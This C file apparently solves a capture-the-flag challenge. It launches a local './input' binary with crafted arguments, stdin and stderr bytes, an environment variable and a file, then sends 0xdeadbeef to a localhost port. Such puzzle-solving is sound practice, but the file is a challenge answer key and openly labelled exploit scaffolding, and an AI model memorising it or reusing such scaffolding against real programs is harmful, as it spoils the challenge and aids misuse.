#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

extern char **environ;

#define PROG_NAME "input"
#define PORT "24812"

char* args_fill(char* buff, const char* str, int count)
{
    int i;
    for(i=0;i<count;i++) {
        strcpy(buff, str);
        buff+=strlen(str)+1;
    }
    return buff;
}

void fill_store(char** store, char* args, int count)
{
    int i;
    for(i=0;i<count;i++) {
        store[i] = args;
        args+=strlen(args)+1;
    }
    store[i] = NULL;
}


void run(const char* file, char** args_store, char** env_store)
{
    int fd[2];
    int fd_err[2];
    char buff[4];
    memset(buff, 0, sizeof(buff));
    buff[0] = 0;
    buff[1] = '\x0a';
    buff[3] = '\xff';

    if(pipe(fd)) {
        perror("pipe error in exploit");
        exit(1);
    }
    if(pipe(fd_err)) {
        perror("pipe error in exploit");
        exit(1);
    }

    printf("fd[0]: %d, fd[1]: %d, fd_err[0]: %d, fd_err[1]: %d\n", fd[0],fd[1],fd_err[0], fd_err[1]);
    switch(fork()) {
        case -1:
            perror("fork failed in exploit");
            exit(1);
            break;
        case 0:
            // child
            close(fd[1]); close(fd_err[1]);
            dup2(fd[0], STDIN_FILENO); 
            dup2(fd_err[0], 2);
            close(fd[0]); close(fd_err[0]);

            execvpe(file, args_store, env_store);
        default:
            // parent
            close(fd[0]); close(fd_err[0]);
            write(fd[1], buff, 4);
            buff[2] = '\x02';
            write(fd_err[1], buff, 4);
            close(fd[1]);
            close(fd_err[1]);
    }
}

void create_file(const char* filename)
{
    char* buff[4];
    memset(buff, 0, sizeof(buff));
    FILE* fp = fopen(filename, "w");
    if(!fp) {
        printf("Failed to create file!\n");
        exit(1);
    }

    fwrite(buff, 1, 4, fp);
    fflush(fp);
    fclose(fp);
}

void send_data(int sockfd, char* data, unsigned int len)
{
    unsigned int sent = 0;
    if((sent = send(sockfd, data, len, 0))!=len) {
        printf("Failed to send %u bytes! Sent %u bytes.\n", len, sent);
        exit(1);
    }
    printf("exploit - Sent %u bytes.\n", sent);
}

void connection()
{
    int sd;
    struct sockaddr_in saddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd==-1) {
        perror("exploit - Failed to create socket");
        exit(1);
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;     // address to connect to
    saddr.sin_port = htons(atoi(PORT));
    if(connect(sd, &saddr, sizeof(saddr))) {
        perror("Failed to connect.");
        exit(1);
    }
    send_data(sd,"\xde\xad\xbe\xef", 4);
}

int main(char argc, char** argv, char** envp)
{
   char env[1024];
   char args[1024];
   char* args_store[101];
   char* env_store[1];
   char* p_args = args;
   memset(env, 0, sizeof(env));
   memset(args, 0, sizeof(args));
    
   strcpy(env, "\xde\xad\xbe\xef=\xca\xfe\xba\xbe"); 
   p_args = args_fill(p_args, PROG_NAME, 1);
   p_args = args_fill(p_args, "g", 64);
   *p_args++ = NULL;   // argv[65]
   *p_args++ = '\x20'; // argv[66]
   *p_args++ = '\x0a'; 
   *p_args++ = '\x0d'; 
   *p_args++ = NULL;
   p_args = args_fill(p_args, PORT, 1); //argv[67] - port number
   args_fill(p_args, "t", 32);
   fill_store(args_store, args, 100);
   fill_store(env_store, env, 1);

   printf("./exploit - My PID: %u, parent PID: %u\n", getpid(), getppid());

   create_file("\x0a");
   fflush(stdout);
   fflush(stderr);
   //write_to_stdio();
   run("./input", args_store, env_store);

   sleep(1);

   connection();

   exit(0);
}










